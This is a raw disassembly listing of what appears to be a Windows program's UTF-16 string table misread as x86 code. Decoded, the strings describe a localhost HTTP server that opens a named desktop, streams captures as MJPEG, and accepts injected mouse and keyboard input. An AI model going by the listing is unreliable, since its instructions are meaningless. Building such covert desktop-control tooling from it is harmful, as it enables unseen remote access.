  4057a1:	21 68 00             	and    %ebp,0x0(%eax)
  4057a4:	76 00                	jbe    0x4057a6
  4057a6:	6e                   	outsb  %ds:(%esi),(%dx)
  4057a7:	00 63 00             	add    %ah,0x0(%ebx)
  4057aa:	20 00                	and    %al,(%eax)
  4057ac:	73 00                	jae    0x4057ae
  4057ae:	74 00                	je     0x4057b0
  4057b0:	61                   	popa
  4057b1:	00 72 00             	add    %dh,0x0(%edx)
  4057b4:	74 00                	je     0x4057b6
  4057b6:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  4057bc:	2e 00 2e             	add    %ch,%cs:(%esi)
  4057bf:	00 2e                	add    %ch,(%esi)
  4057c1:	00 00                	add    %al,(%eax)
  4057c3:	57                   	push   %edi
  4057c4:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4057c8:	73 00                	jae    0x4057ca
  4057ca:	6b 00 74             	imul   $0x74,(%eax),%eax
  4057cd:	00 6f 00             	add    %ch,0x0(%edi)
  4057d0:	70 00                	jo     0x4057d2
  4057d2:	3d 00 7b 00 30       	cmp    $0x30007b00,%eax
  4057d7:	00 7d 00             	add    %bh,0x0(%ebp)
  4057da:	2c 00                	sub    $0x0,%al
  4057dc:	20 00                	and    %al,(%eax)
  4057de:	70 00                	jo     0x4057e0
  4057e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4057e1:	00 72 00             	add    %dh,0x0(%edx)
  4057e4:	74 00                	je     0x4057e6
  4057e6:	3d 00 7b 00 31       	cmp    $0x31007b00,%eax
  4057eb:	00 7d 00             	add    %bh,0x0(%ebp)
  4057ee:	2c 00                	sub    $0x0,%al
  4057f0:	20 00                	and    %al,(%eax)
  4057f2:	66 00 70 00          	data16 add %dh,0x0(%eax)
  4057f6:	73 00                	jae    0x4057f8
  4057f8:	3d 00 7b 00 32       	cmp    $0x32007b00,%eax
  4057fd:	00 7d 00             	add    %bh,0x0(%ebp)
  405800:	2c 00                	sub    $0x0,%al
  405802:	20 00                	and    %al,(%eax)
  405804:	71 00                	jno    0x405806
  405806:	75 00                	jne    0x405808
  405808:	61                   	popa
  405809:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40580d:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  405811:	00 3d 00 7b 00 33    	add    %bh,0x33007b00
  405817:	00 7d 00             	add    %bh,0x0(%ebp)
  40581a:	00 0f                	add    %cl,(%edi)
  40581c:	63 00                	arpl   %eax,(%eax)
  40581e:	61                   	popa
  40581f:	00 70 00             	add    %dh,0x0(%eax)
  405822:	74 00                	je     0x405824
  405824:	75 00                	jne    0x405826
  405826:	72 00                	jb     0x405828
  405828:	65 00 00             	add    %al,%gs:(%eax)
  40582b:	13 2d 00 2d 00 64    	adc    0x64002d00,%ebp
  405831:	00 65 00             	add    %ah,0x0(%ebp)
  405834:	73 00                	jae    0x405836
  405836:	6b 00 74             	imul   $0x74,(%eax),%eax
  405839:	00 6f 00             	add    %ch,0x0(%edi)
  40583c:	70 00                	jo     0x40583e
  40583e:	01 0d 2d 00 2d 00    	add    %ecx,0x2d002d
  405844:	70 00                	jo     0x405846
  405846:	6f                   	outsl  %ds:(%esi),(%dx)
  405847:	00 72 00             	add    %dh,0x0(%edx)
  40584a:	74 00                	je     0x40584c
  40584c:	01 0b                	add    %ecx,(%ebx)
  40584e:	2d 00 2d 00 66       	sub    $0x66002d00,%eax
  405853:	00 70 00             	add    %dh,0x0(%eax)
  405856:	73 00                	jae    0x405858
  405858:	01 13                	add    %edx,(%ebx)
  40585a:	2d 00 2d 00 71       	sub    $0x71002d00,%eax
  40585f:	00 75 00             	add    %dh,0x0(%ebp)
  405862:	61                   	popa
  405863:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  405867:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40586b:	00 01                	add    %al,(%ecx)
  40586d:	31 4f 00             	xor    %ecx,0x0(%edi)
  405870:	70 00                	jo     0x405872
  405872:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  405876:	44                   	inc    %esp
  405877:	00 65 00             	add    %ah,0x0(%ebp)
  40587a:	73 00                	jae    0x40587c
  40587c:	6b 00 74             	imul   $0x74,(%eax),%eax
  40587f:	00 6f 00             	add    %ch,0x0(%edi)
  405882:	70 00                	jo     0x405884
  405884:	20 00                	and    %al,(%eax)
  405886:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40588a:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  405890:	64 00 20             	add    %ah,%fs:(%eax)
  405893:	00 28                	add    %ch,(%eax)
  405895:	00 7b 00             	add    %bh,0x0(%ebx)
  405898:	30 00                	xor    %al,(%eax)
  40589a:	7d 00                	jge    0x40589c
  40589c:	29 00                	sub    %eax,(%eax)
  40589e:	00 3b                	add    %bh,(%ebx)
  4058a0:	53                   	push   %ebx
  4058a1:	00 65 00             	add    %ah,0x0(%ebp)
  4058a4:	74 00                	je     0x4058a6
  4058a6:	54                   	push   %esp
  4058a7:	00 68 00             	add    %ch,0x0(%eax)
  4058aa:	72 00                	jb     0x4058ac
  4058ac:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4058b0:	64 00 44 00 65       	add    %al,%fs:0x65(%eax,%eax,1)
  4058b5:	00 73 00             	add    %dh,0x0(%ebx)
  4058b8:	6b 00 74             	imul   $0x74,(%eax),%eax
  4058bb:	00 6f 00             	add    %ch,0x0(%edi)
  4058be:	70 00                	jo     0x4058c0
  4058c0:	20 00                	and    %al,(%eax)
  4058c2:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  4058c6:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  4058cc:	64 00 20             	add    %ah,%fs:(%eax)
  4058cf:	00 28                	add    %ch,(%eax)
  4058d1:	00 7b 00             	add    %bh,0x0(%ebx)
  4058d4:	30 00                	xor    %al,(%eax)
  4058d6:	7d 00                	jge    0x4058d8
  4058d8:	29 00                	sub    %eax,(%eax)
  4058da:	00 1f                	add    %bl,(%edi)
  4058dc:	43                   	inc    %ebx
  4058dd:	00 61 00             	add    %ah,0x0(%ecx)
  4058e0:	70 00                	jo     0x4058e2
  4058e2:	74 00                	je     0x4058e4
  4058e4:	75 00                	jne    0x4058e6
  4058e6:	72 00                	jb     0x4058e8
  4058e8:	65 00 20             	add    %ah,%gs:(%eax)
  4058eb:	00 65 00             	add    %ah,0x0(%ebp)
  4058ee:	72 00                	jb     0x4058f0
  4058f0:	72 00                	jb     0x4058f2
  4058f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4058f3:	00 72 00             	add    %dh,0x0(%edx)
  4058f6:	3a 00                	cmp    (%eax),%al
  4058f8:	20 00                	and    %al,(%eax)
  4058fa:	00 0d 28 00 6e 00    	add    %cl,0x6e0028
  405900:	6f                   	outsl  %ds:(%esi),(%dx)
  405901:	00 6e 00             	add    %ch,0x0(%esi)
  405904:	65 00 29             	add    %ch,%gs:(%ecx)
  405907:	00 00                	add    %al,(%eax)
  405909:	23 68 00             	and    0x0(%eax),%ebp
  40590c:	74 00                	je     0x40590e
  40590e:	74 00                	je     0x405910
  405910:	70 00                	jo     0x405912
  405912:	3a 00                	cmp    (%eax),%al
  405914:	2f                   	das
  405915:	00 2f                	add    %ch,(%edi)
  405917:	00 31                	add    %dh,(%ecx)
  405919:	00 32                	add    %dh,(%edx)
  40591b:	00 37                	add    %dh,(%edi)
  40591d:	00 2e                	add    %ch,(%esi)
  40591f:	00 30                	add    %dh,(%eax)
  405921:	00 2e                	add    %ch,(%esi)
  405923:	00 30                	add    %dh,(%eax)
  405925:	00 2e                	add    %ch,(%esi)
  405927:	00 31                	add    %dh,(%ecx)
  405929:	00 3a                	add    %bh,(%edx)
  40592b:	00 00                	add    %al,(%eax)
  40592d:	03 2f                	add    (%edi),%ebp
  40592f:	00 00                	add    %al,(%eax)
  405931:	4f                   	dec    %edi
  405932:	48                   	dec    %eax
  405933:	00 54 00 54          	add    %dl,0x54(%eax,%eax,1)
  405937:	00 50 00             	add    %dl,0x0(%eax)
  40593a:	20 00                	and    %al,(%eax)
  40593c:	6c                   	insb   (%dx),%es:(%edi)
  40593d:	00 69 00             	add    %ch,0x0(%ecx)
  405940:	73 00                	jae    0x405942
  405942:	74 00                	je     0x405944
  405944:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  405948:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40594e:	20 00                	and    %al,(%eax)
  405950:	6f                   	outsl  %ds:(%esi),(%dx)
  405951:	00 6e 00             	add    %ch,0x0(%esi)
  405954:	20 00                	and    %al,(%eax)
  405956:	68 00 74 00 74       	push   $0x74007400
  40595b:	00 70 00             	add    %dh,0x0(%eax)
  40595e:	3a 00                	cmp    (%eax),%al
  405960:	2f                   	das
  405961:	00 2f                	add    %ch,(%edi)
  405963:	00 31                	add    %dh,(%ecx)
  405965:	00 32                	add    %dh,(%edx)
  405967:	00 37                	add    %dh,(%edi)
  405969:	00 2e                	add    %ch,(%esi)
  40596b:	00 30                	add    %dh,(%eax)
  40596d:	00 2e                	add    %ch,(%esi)
  40596f:	00 30                	add    %dh,(%eax)
  405971:	00 2e                	add    %ch,(%esi)
  405973:	00 31                	add    %dh,(%ecx)
  405975:	00 3a                	add    %bh,(%edx)
  405977:	00 7b 00             	add    %bh,0x0(%ebx)
  40597a:	30 00                	xor    %al,(%eax)
  40597c:	7d 00                	jge    0x40597e
  40597e:	2f                   	das
  40597f:	00 00                	add    %al,(%eax)
  405981:	07                   	pop    %es
  405982:	47                   	inc    %edi
  405983:	00 45 00             	add    %al,0x0(%ebp)
  405986:	54                   	push   %esp
  405987:	00 00                	add    %al,(%eax)
  405989:	31 74 00 65          	xor    %esi,0x65(%eax,%eax,1)
  40598d:	00 78 00             	add    %bh,0x0(%eax)
  405990:	74 00                	je     0x405992
  405992:	2f                   	das
  405993:	00 68 00             	add    %ch,0x0(%eax)
  405996:	74 00                	je     0x405998
  405998:	6d                   	insl   (%dx),%es:(%edi)
  405999:	00 6c 00 3b          	add    %ch,0x3b(%eax,%eax,1)
  40599d:	00 20                	add    %ah,(%eax)
  40599f:	00 63 00             	add    %ah,0x0(%ebx)
  4059a2:	68 00 61 00 72       	push   $0x72006100
  4059a7:	00 73 00             	add    %dh,0x0(%ebx)
  4059aa:	65 00 74 00 3d       	add    %dh,%gs:0x3d(%eax,%eax,1)
  4059af:	00 75 00             	add    %dh,0x0(%ebp)
  4059b2:	74 00                	je     0x4059b4
  4059b4:	66 00 2d 00 38 00 01 	data16 add %ch,0x1003800
  4059bb:	0f 2f 00             	comiss (%eax),%xmm0
  4059be:	73 00                	jae    0x4059c0
  4059c0:	74 00                	je     0x4059c2
  4059c2:	72 00                	jb     0x4059c4
  4059c4:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  4059c8:	6d                   	insl   (%dx),%es:(%edi)
  4059c9:	00 00                	add    %al,(%eax)
  4059cb:	09 50 00             	or     %edx,0x0(%eax)
  4059ce:	4f                   	dec    %edi
  4059cf:	00 53 00             	add    %dl,0x0(%ebx)
  4059d2:	54                   	push   %esp
  4059d3:	00 00                	add    %al,(%eax)
  4059d5:	0d 2f 00 69 00       	or     $0x69002f,%eax
  4059da:	6e                   	outsb  %ds:(%esi),(%dx)
  4059db:	00 70 00             	add    %dh,0x0(%eax)
  4059de:	75 00                	jne    0x4059e0
  4059e0:	74 00                	je     0x4059e2
  4059e2:	00 05 6f 00 6b 00    	add    %al,0x6b006f
  4059e8:	00 15 74 00 65 00    	add    %dl,0x650074
  4059ee:	78 00                	js     0x4059f0
  4059f0:	74 00                	je     0x4059f2
  4059f2:	2f                   	das
  4059f3:	00 70 00             	add    %dh,0x0(%eax)
  4059f6:	6c                   	insb   (%dx),%es:(%edi)
  4059f7:	00 61 00             	add    %ah,0x0(%ecx)
  4059fa:	69 00 6e 00 00 11    	imul   $0x1100006e,(%eax),%eax
  405a00:	2f                   	das
  405a01:	00 77 00             	add    %dh,0x0(%edi)
  405a04:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  405a0a:	6f                   	outsl  %ds:(%esi),(%dx)
  405a0b:	00 77 00             	add    %dh,0x0(%edi)
  405a0e:	73 00                	jae    0x405a10
  405a10:	00 3f                	add    %bh,(%edi)
  405a12:	61                   	popa
  405a13:	00 70 00             	add    %dh,0x0(%eax)
  405a16:	70 00                	jo     0x405a18
  405a18:	6c                   	insb   (%dx),%es:(%edi)
  405a19:	00 69 00             	add    %ch,0x0(%ecx)
  405a1c:	63 00                	arpl   %eax,(%eax)
  405a1e:	61                   	popa
  405a1f:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  405a23:	00 6f 00             	add    %ch,0x0(%edi)
  405a26:	6e                   	outsb  %ds:(%esi),(%dx)
  405a27:	00 2f                	add    %ch,(%edi)
  405a29:	00 6a 00             	add    %ch,0x0(%edx)
  405a2c:	73 00                	jae    0x405a2e
  405a2e:	6f                   	outsl  %ds:(%esi),(%dx)
  405a2f:	00 6e 00             	add    %ch,0x0(%esi)
  405a32:	3b 00                	cmp    (%eax),%eax
  405a34:	20 00                	and    %al,(%eax)
  405a36:	63 00                	arpl   %eax,(%eax)
  405a38:	68 00 61 00 72       	push   $0x72006100
  405a3d:	00 73 00             	add    %dh,0x0(%ebx)
  405a40:	65 00 74 00 3d       	add    %dh,%gs:0x3d(%eax,%eax,1)
  405a45:	00 75 00             	add    %dh,0x0(%ebp)
  405a48:	74 00                	je     0x405a4a
  405a4a:	66 00 2d 00 38 00 01 	data16 add %ch,0x1003800
  405a51:	53                   	push   %ebx
  405a52:	6d                   	insl   (%dx),%es:(%edi)
  405a53:	00 75 00             	add    %dh,0x0(%ebp)
  405a56:	6c                   	insb   (%dx),%es:(%edi)
  405a57:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  405a5b:	00 70 00             	add    %dh,0x0(%eax)
  405a5e:	61                   	popa
  405a5f:	00 72 00             	add    %dh,0x0(%edx)
  405a62:	74 00                	je     0x405a64
  405a64:	2f                   	das
  405a65:	00 78 00             	add    %bh,0x0(%eax)
  405a68:	2d 00 6d 00 69       	sub    $0x69006d00,%eax
  405a6d:	00 78 00             	add    %bh,0x0(%eax)
  405a70:	65 00 64 00 2d       	add    %ah,%gs:0x2d(%eax,%eax,1)
  405a75:	00 72 00             	add    %dh,0x0(%edx)
  405a78:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  405a7c:	6c                   	insb   (%dx),%es:(%edi)
  405a7d:	00 61 00             	add    %ah,0x0(%ecx)
  405a80:	63 00                	arpl   %eax,(%eax)
  405a82:	65 00 3b             	add    %bh,%gs:(%ebx)
  405a85:	00 20                	add    %ah,(%eax)
  405a87:	00 62 00             	add    %ah,0x0(%edx)
  405a8a:	6f                   	outsl  %ds:(%esi),(%dx)
  405a8b:	00 75 00             	add    %dh,0x0(%ebp)
  405a8e:	6e                   	outsb  %ds:(%esi),(%dx)
  405a8f:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  405a93:	00 72 00             	add    %dh,0x0(%edx)
  405a96:	79 00                	jns    0x405a98
  405a98:	3d 00 66 00 72       	cmp    $0x72006600,%eax
  405a9d:	00 61 00             	add    %ah,0x0(%ecx)
  405aa0:	6d                   	insl   (%dx),%es:(%edi)
  405aa1:	00 65 00             	add    %ah,0x0(%ebp)
  405aa4:	01 1b                	add    %ebx,(%ebx)
  405aa6:	43                   	inc    %ebx
  405aa7:	00 61 00             	add    %ah,0x0(%ecx)
  405aaa:	63 00                	arpl   %eax,(%eax)
  405aac:	68 00 65 00 2d       	push   $0x2d006500
  405ab1:	00 43 00             	add    %al,0x0(%ebx)
  405ab4:	6f                   	outsl  %ds:(%esi),(%dx)
  405ab5:	00 6e 00             	add    %ch,0x0(%esi)
  405ab8:	74 00                	je     0x405aba
  405aba:	72 00                	jb     0x405abc
  405abc:	6f                   	outsl  %ds:(%esi),(%dx)
  405abd:	00 6c 00 01          	add    %ch,0x1(%eax,%eax,1)
  405ac1:	47                   	inc    %edi
  405ac2:	6e                   	outsb  %ds:(%esi),(%dx)
  405ac3:	00 6f 00             	add    %ch,0x0(%edi)
  405ac6:	2d 00 63 00 61       	sub    $0x61006300,%eax
  405acb:	00 63 00             	add    %ah,0x0(%ebx)
  405ace:	68 00 65 00 2c       	push   $0x2c006500
  405ad3:	00 20                	add    %ah,(%eax)
  405ad5:	00 6e 00             	add    %ch,0x0(%esi)
  405ad8:	6f                   	outsl  %ds:(%esi),(%dx)
  405ad9:	00 2d 00 73 00 74    	add    %ch,0x74007300
  405adf:	00 6f 00             	add    %ch,0x0(%edi)
  405ae2:	72 00                	jb     0x405ae4
  405ae4:	65 00 2c 00          	add    %ch,%gs:(%eax,%eax,1)
  405ae8:	20 00                	and    %al,(%eax)
  405aea:	6d                   	insl   (%dx),%es:(%edi)
  405aeb:	00 75 00             	add    %dh,0x0(%ebp)
  405aee:	73 00                	jae    0x405af0
  405af0:	74 00                	je     0x405af2
  405af2:	2d 00 72 00 65       	sub    $0x65007200,%eax
  405af7:	00 76 00             	add    %dh,0x0(%esi)
  405afa:	61                   	popa
  405afb:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  405aff:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  405b03:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  405b07:	00 01                	add    %al,(%ecx)
  405b09:	0d 50 00 72 00       	or     $0x720050,%eax
  405b0e:	61                   	popa
  405b0f:	00 67 00             	add    %ah,0x0(%edi)
  405b12:	6d                   	insl   (%dx),%es:(%edi)
  405b13:	00 61 00             	add    %ah,0x0(%ecx)
  405b16:	00 11                	add    %dl,(%ecx)
  405b18:	6e                   	outsb  %ds:(%esi),(%dx)
  405b19:	00 6f 00             	add    %ch,0x0(%edi)
  405b1c:	2d 00 63 00 61       	sub    $0x61006300,%eax
  405b21:	00 63 00             	add    %ah,0x0(%ebx)
  405b24:	68 00 65 00 01       	push   $0x1006500
  405b29:	0f 45 00             	cmovne (%eax),%eax
  405b2c:	78 00                	js     0x405b2e
  405b2e:	70 00                	jo     0x405b30
  405b30:	69 00 72 00 65 00    	imul   $0x650072,(%eax),%eax
  405b36:	73 00                	jae    0x405b38
  405b38:	00 03                	add    %al,(%ebx)
  405b3a:	30 00                	xor    %al,(%eax)
  405b3c:	00 67 2d             	add    %ah,0x2d(%edi)
  405b3f:	00 2d 00 66 00 72    	add    %ch,0x72006600
  405b45:	00 61 00             	add    %ah,0x0(%ecx)
  405b48:	6d                   	insl   (%dx),%es:(%edi)
  405b49:	00 65 00             	add    %ah,0x0(%ebp)
  405b4c:	0d 00 0a 00 43       	or     $0x43000a00,%eax
  405b51:	00 6f 00             	add    %ch,0x0(%edi)
  405b54:	6e                   	outsb  %ds:(%esi),(%dx)
  405b55:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  405b59:	00 6e 00             	add    %ch,0x0(%esi)
  405b5c:	74 00                	je     0x405b5e
  405b5e:	2d 00 54 00 79       	sub    $0x79005400,%eax
  405b63:	00 70 00             	add    %dh,0x0(%eax)
  405b66:	65 00 3a             	add    %bh,%gs:(%edx)
  405b69:	00 20                	add    %ah,(%eax)
  405b6b:	00 69 00             	add    %ch,0x0(%ecx)
  405b6e:	6d                   	insl   (%dx),%es:(%edi)
  405b6f:	00 61 00             	add    %ah,0x0(%ecx)
  405b72:	67 00 65 00          	add    %ah,0x0(%di)
  405b76:	2f                   	das
  405b77:	00 6a 00             	add    %ch,0x0(%edx)
  405b7a:	70 00                	jo     0x405b7c
  405b7c:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  405b80:	0d 00 0a 00 43       	or     $0x43000a00,%eax
  405b85:	00 6f 00             	add    %ch,0x0(%edi)
  405b88:	6e                   	outsb  %ds:(%esi),(%dx)
  405b89:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  405b8d:	00 6e 00             	add    %ch,0x0(%esi)
  405b90:	74 00                	je     0x405b92
  405b92:	2d 00 4c 00 65       	sub    $0x65004c00,%eax
  405b97:	00 6e 00             	add    %ch,0x0(%esi)
  405b9a:	67 00 74 00          	add    %dh,0x0(%si)
  405b9e:	68 00 3a 00 20       	push   $0x20003a00
  405ba3:	00 01                	add    %al,(%ecx)
  405ba5:	09 0d 00 0a 00 0d    	or     %ecx,0xd000a00
  405bab:	00 0a                	add    %cl,(%edx)
  405bad:	00 00                	add    %al,(%eax)
  405baf:	09 74 00 79          	or     %esi,0x79(%eax,%eax,1)
  405bb3:	00 70 00             	add    %dh,0x0(%eax)
  405bb6:	65 00 00             	add    %al,%gs:(%eax)
  405bb9:	03 78 00             	add    0x0(%eax),%edi
  405bbc:	00 03                	add    %al,(%ebx)
  405bbe:	79 00                	jns    0x405bc0
  405bc0:	00 0d 62 00 75 00    	add    %cl,0x750062
  405bc6:	74 00                	je     0x405bc8
  405bc8:	74 00                	je     0x405bca
  405bca:	6f                   	outsl  %ds:(%esi),(%dx)
  405bcb:	00 6e 00             	add    %ch,0x0(%esi)
  405bce:	00 13                	add    %dl,(%ebx)
  405bd0:	6d                   	insl   (%dx),%es:(%edi)
  405bd1:	00 6f 00             	add    %ch,0x0(%edi)
  405bd4:	75 00                	jne    0x405bd6
  405bd6:	73 00                	jae    0x405bd8
  405bd8:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  405bdc:	6f                   	outsl  %ds:(%esi),(%dx)
  405bdd:	00 76 00             	add    %dh,0x0(%esi)
  405be0:	65 00 00             	add    %al,%gs:(%eax)
  405be3:	13 6d 00             	adc    0x0(%ebp),%ebp
  405be6:	6f                   	outsl  %ds:(%esi),(%dx)
  405be7:	00 75 00             	add    %dh,0x0(%ebp)
  405bea:	73 00                	jae    0x405bec
  405bec:	65 00 64 00 6f       	add    %ah,%gs:0x6f(%eax,%eax,1)
  405bf1:	00 77 00             	add    %dh,0x0(%edi)
  405bf4:	6e                   	outsb  %ds:(%esi),(%dx)
  405bf5:	00 00                	add    %al,(%eax)
  405bf7:	0f 6d                	(bad)
  405bf9:	00 6f 00             	add    %ch,0x0(%edi)
  405bfc:	75 00                	jne    0x405bfe
  405bfe:	73 00                	jae    0x405c00
  405c00:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  405c04:	70 00                	jo     0x405c06
  405c06:	00 0b                	add    %cl,(%ebx)
  405c08:	63 00                	arpl   %eax,(%eax)
  405c0a:	6c                   	insb   (%dx),%es:(%edi)
  405c0b:	00 69 00             	add    %ch,0x0(%ecx)
  405c0e:	63 00                	arpl   %eax,(%eax)
  405c10:	6b 00 00             	imul   $0x0,(%eax),%eax
  405c13:	0d 73 00 63 00       	or     $0x630073,%eax
  405c18:	72 00                	jb     0x405c1a
  405c1a:	6f                   	outsl  %ds:(%esi),(%dx)
  405c1b:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  405c1f:	00 00                	add    %al,(%eax)
  405c21:	0f 6b 00             	packssdw (%eax),%mm0
  405c24:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  405c28:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  405c2c:	77 00                	ja     0x405c2e
  405c2e:	6e                   	outsb  %ds:(%esi),(%dx)
  405c2f:	00 00                	add    %al,(%eax)
  405c31:	0b 6b 00             	or     0x0(%ebx),%ebp
  405c34:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  405c38:	75 00                	jne    0x405c3a
  405c3a:	70 00                	jo     0x405c3c
  405c3c:	00 09                	add    %cl,(%ecx)
  405c3e:	63 00                	arpl   %eax,(%eax)
  405c40:	68 00 61 00 72       	push   $0x72006100
  405c45:	00 00                	add    %al,(%eax)
  405c47:	0b 72 00             	or     0x0(%edx),%esi
  405c4a:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  405c50:	74 00                	je     0x405c52
  405c52:	00 0d 64 00 65 00    	add    %cl,0x650064
  405c58:	6c                   	insb   (%dx),%es:(%edi)
  405c59:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  405c5d:	00 59 00             	add    %bl,0x0(%ecx)
  405c60:	00 0f                	add    %cl,(%edi)
  405c62:	6b 00 65             	imul   $0x65,(%eax),%eax
  405c65:	00 79 00             	add    %bh,0x0(%ecx)
  405c68:	43                   	inc    %ebx
  405c69:	00 6f 00             	add    %ch,0x0(%edi)
  405c6c:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  405c70:	00 03                	add    %al,(%ebx)
  405c72:	7b 00                	jnp    0x405c74
  405c74:	00 19                	add    %bl,(%ecx)
  405c76:	22 00                	and    (%eax),%al
  405c78:	63 00                	arpl   %eax,(%eax)
  405c7a:	6f                   	outsl  %ds:(%esi),(%dx)
  405c7b:	00 6e 00             	add    %ch,0x0(%esi)
  405c7e:	6e                   	outsb  %ds:(%esi),(%dx)
  405c7f:	00 65 00             	add    %ah,0x0(%ebp)
  405c82:	63 00                	arpl   %eax,(%eax)
  405c84:	74 00                	je     0x405c86
  405c86:	65 00 64 00 22       	add    %ah,%gs:0x22(%eax,%eax,1)
  405c8b:	00 3a                	add    %bh,(%edx)
  405c8d:	00 00                	add    %al,(%eax)
  405c8f:	0b 66 00             	or     0x0(%esi),%esp
  405c92:	61                   	popa
  405c93:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  405c97:	00 65 00             	add    %ah,0x0(%ebp)
  405c9a:	00 09                	add    %cl,(%ecx)
  405c9c:	74 00                	je     0x405c9e
  405c9e:	72 00                	jb     0x405ca0
  405ca0:	75 00                	jne    0x405ca2
  405ca2:	65 00 00             	add    %al,%gs:(%eax)
  405ca5:	03 2c 00             	add    (%eax,%eax,1),%ebp
  405ca8:	00 15 22 00 74 00    	add    %dl,0x740022
  405cae:	61                   	popa
  405caf:	00 72 00             	add    %dh,0x0(%edx)
  405cb2:	67 00 65 00          	add    %ah,0x0(%di)
  405cb6:	74 00                	je     0x405cb8
  405cb8:	22 00                	and    (%eax),%al
  405cba:	3a 00                	cmp    (%eax),%al
  405cbc:	22 00                	and    (%eax),%al
  405cbe:	00 03                	add    %al,(%ebx)
  405cc0:	58                   	pop    %eax
  405cc1:	00 00                	add    %al,(%eax)
  405cc3:	05 22 00 2c 00       	add    $0x2c0022,%eax
  405cc8:	00 13                	add    %dl,(%ebx)
  405cca:	22 00                	and    (%eax),%al
  405ccc:	74 00                	je     0x405cce
  405cce:	69 00 74 00 6c 00    	imul   $0x6c0074,(%eax),%eax
  405cd4:	65 00 22             	add    %ah,%gs:(%edx)
  405cd7:	00 3a                	add    %bh,(%edx)
  405cd9:	00 22                	add    %ah,(%edx)
  405cdb:	00 00                	add    %al,(%eax)
  405cdd:	11 22                	adc    %esp,(%edx)
  405cdf:	00 77 00             	add    %dh,0x0(%edi)
  405ce2:	69 00 64 00 74 00    	imul   $0x740064,(%eax),%eax
  405ce8:	68 00 22 00 3a       	push   $0x3a002200
  405ced:	00 00                	add    %al,(%eax)
  405cef:	13 22                	adc    (%edx),%esp
  405cf1:	00 68 00             	add    %ch,0x0(%eax)
  405cf4:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  405cf8:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  405cfc:	74 00                	je     0x405cfe
  405cfe:	22 00                	and    (%eax),%al
  405d00:	3a 00                	cmp    (%eax),%al
  405d02:	00 0d 22 00 66 00    	add    %cl,0x660022
  405d08:	70 00                	jo     0x405d0a
  405d0a:	73 00                	jae    0x405d0c
  405d0c:	22 00                	and    (%eax),%al
  405d0e:	3a 00                	cmp    (%eax),%al
  405d10:	00 07                	add    %al,(%edi)
  405d12:	30 00                	xor    %al,(%eax)
  405d14:	2e 00 30             	add    %dh,%cs:(%eax)
  405d17:	00 00                	add    %al,(%eax)
  405d19:	17                   	pop    %ss
  405d1a:	22 00                	and    (%eax),%al
  405d1c:	77 00                	ja     0x405d1e
  405d1e:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  405d24:	6f                   	outsl  %ds:(%esi),(%dx)
  405d25:	00 77 00             	add    %dh,0x0(%edi)
  405d28:	73 00                	jae    0x405d2a
  405d2a:	22 00                	and    (%eax),%al
  405d2c:	3a 00                	cmp    (%eax),%al
  405d2e:	5b                   	pop    %ebx
  405d2f:	00 00                	add    %al,(%eax)
  405d31:	11 22                	adc    %esp,(%edx)
  405d33:	00 68 00             	add    %ch,0x0(%eax)
  405d36:	77 00                	ja     0x405d38
  405d38:	6e                   	outsb  %ds:(%esi),(%dx)
  405d39:	00 64 00 22          	add    %ah,0x22(%eax,%eax,1)
  405d3d:	00 3a                	add    %bh,(%edx)
  405d3f:	00 22                	add    %ah,(%edx)
  405d41:	00 00                	add    %al,(%eax)
  405d43:	09 22                	or     %esp,(%edx)
  405d45:	00 78 00             	add    %bh,0x0(%eax)
  405d48:	22 00                	and    (%eax),%al
  405d4a:	3a 00                	cmp    (%eax),%al
  405d4c:	00 09                	add    %cl,(%ecx)
  405d4e:	22 00                	and    (%eax),%al
  405d50:	79 00                	jns    0x405d52
  405d52:	22 00                	and    (%eax),%al
  405d54:	3a 00                	cmp    (%eax),%al
  405d56:	00 09                	add    %cl,(%ecx)
  405d58:	22 00                	and    (%eax),%al
  405d5a:	77 00                	ja     0x405d5c
  405d5c:	22 00                	and    (%eax),%al
  405d5e:	3a 00                	cmp    (%eax),%al
  405d60:	00 09                	add    %cl,(%ecx)
  405d62:	22 00                	and    (%eax),%al
  405d64:	68 00 22 00 3a       	push   $0x3a002200
  405d69:	00 00                	add    %al,(%eax)
  405d6b:	03 7d 00             	add    0x0(%ebp),%edi
  405d6e:	00 05 5d 00 7d 00    	add    %al,0x7d005d
